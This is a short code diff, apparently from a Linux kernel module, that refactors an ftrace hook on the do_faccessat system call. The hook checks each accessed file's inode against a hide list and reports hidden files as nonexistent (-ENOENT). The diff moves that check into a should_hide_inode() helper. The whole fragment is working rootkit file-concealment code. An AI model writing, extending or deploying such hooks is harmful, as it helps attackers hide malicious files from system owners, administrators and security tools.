@@ -43,7 +43,6 @@ long hook_do_faccessat(int dfd, const char __user *filename, int mode)
     struct path path;
     int res;
     unsigned long ino;
-    struct inode_list *entry;
 
     // mimic lookup logic of original function
     unsigned int lookup_flags = LOOKUP_FOLLOW;
@@ -56,17 +55,11 @@ long hook_do_faccessat(int dfd, const char __user *filename, int mode)
     ino = path.dentry->d_inode->i_ino;
 
     // check if inode should be hidden
-    list_for_each_entry(entry, &inodes_to_hide, list) {
-        if (entry->ino == ino) {
-            goto hide;
-        }
-    }
+    if (should_hide_inode(ino))
+        return -ENOENT;
 
 call_orig:
     return orig_do_faccessat(dfd, filename, mode);
-
-hide:
-    return -ENOENT;
 }
 
 static struct ftrace_hook hooks[] = {
